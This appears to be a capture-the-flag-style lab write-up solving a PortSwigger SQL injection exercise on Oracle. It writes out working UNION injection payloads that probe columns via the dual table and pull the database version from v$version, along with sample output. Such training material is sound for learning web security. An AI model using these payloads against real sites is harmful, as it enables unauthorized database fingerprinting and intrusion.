# Lab: SQL Injection Attack, Querying the Database Type and Version on Oracle

**Difficulty:** Practitioner
**Status:** Solved ✅

## Description

This lab contains a SQL injection vulnerability in the product category filter. A UNION attack can be used to retrieve the results of an injected query.

**Goal:** Display the database version string.

## Key Concept

On Oracle databases, every `SELECT` statement must specify a table to select `FROM` — unlike MySQL, you can't just do `SELECT 'abc'`. Oracle provides a built-in table called `dual` for exactly this purpose:

```sql
UNION SELECT 'abc' FROM dual
```

## Steps

### 1. Intercept the request
Use Burp Suite to intercept and modify the request that sets the product category filter (the `category` parameter in the URL).

### 2. Determine the number of columns and their data types
Confirm the query returns two columns, both containing text, using:

```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

If this loads without an error, you've confirmed 2 text columns.

### 3. Retrieve the database version
Oracle stores version info in the `v$version` view, in a column called `BANNER`. Use:

```
'+UNION+SELECT+BANNER,NULL+FROM+v$version--
```

### Full injected query

```sql
' UNION SELECT BANNER,NULL FROM v$version--
```

## Result

The response displays the Oracle database version banner, e.g.:

```
CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production
```

Successfully retrieving the version string confirms the lab is solved.

## Takeaways

- Oracle requires `FROM` in every `SELECT`; use the `dual` pseudo-table when no real table is needed.
- The `v$version` view (and its `BANNER` column) is the standard way to fingerprint Oracle version info via SQLi.
- Always confirm column count and data types with a UNION-based probe before pulling real data.

**Reference:** [PortSwigger SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
